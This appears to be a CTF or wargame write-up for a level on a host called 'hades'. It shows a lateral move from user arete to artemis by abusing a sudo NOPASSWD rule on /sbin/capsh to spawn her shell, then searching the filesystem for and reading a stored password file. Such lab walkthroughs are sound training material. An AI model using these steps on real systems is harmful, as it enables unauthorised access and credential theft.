# 0x09

moving from `arete` to `artemis`

---

The mission clue pointed to a specific binary "gift" provided by the user **artemis**:

```bash
arete@hades:~$ cat mission.txt 
################
# MISSION 0x09 #
################

## EN ##
The user artemis allows us to use some binary on her behalf. Its a gift...
```

I checked the current directory and confirmed the presence of the mission file and flag, then inspected my available sudo privileges.

```bash
arete@hades:~$ ls -la
total 36
...
-rw-r----- 1 root  arete   22 Apr  5  2024 flagz.txt  
-rw-r----- 1 root  arete  227 Apr  5  2024 mission.txt
```

### The Solution:

Using `sudo -l`, I discovered that the user `arete` was permitted to run the `/sbin/capsh` binary as `artemis` without requiring a password.

```bash
arete@hades:~$ sudo -l
...
User arete may run the following commands on hades:
    (artemis) NOPASSWD: /sbin/capsh
```

By executing `capsh` with the `--` argument while specifying the target user with `sudo`, I was able to spawn an interactive shell with Artemis's privileges.

```bash
arete@hades:~$ sudo -u artemis /sbin/capsh --  
artemis@hades:/pwned/arete$ id
uid=2051(artemis) gid=2051(artemis) groups=2051(artemis)
```

### Finding the Password:

Once I had a shell as `artemis`, I needed to find her actual login password to establish a persistent session. I searched the filesystem for any files related to her account.

```bash
artemis@hades:~$ find / -name "*artemis*" 2>/dev/null
/usr/share/artemis_pass.txt
/pwned/artemis

artemis@hades:~$ cat /usr/share/artemis_pass.txt 
[REDACTED]
```

### Explanation:

* **`sudo -u artemis`**: This command instructs the system to run the subsequent binary with the identity and permissions of the user `artemis`.
* **`capsh` (Capability Shell)**: A tool primarily used for exploring and debugging Linux capabilities. It is a well-known binary in privilege escalation because it has a built-in function to drop into a shell.
* **The `--` Flag**: This argument tells `capsh` to stop processing further options and launch an interactive shell. Since it was invoked via `sudo`, the new shell inherited the UID of `artemis`.
* **File Discovery**: Using `find` is a standard step after gaining a shell to locate hidden credentials or configuration files that aren't stored in the home directory.

### Execution:

I successfully transitioned into a shell as `artemis`.

```bash
artemis@hades:~$ id
uid=2051(artemis) gid=2051(artemis) groups=2051(artemis)
```
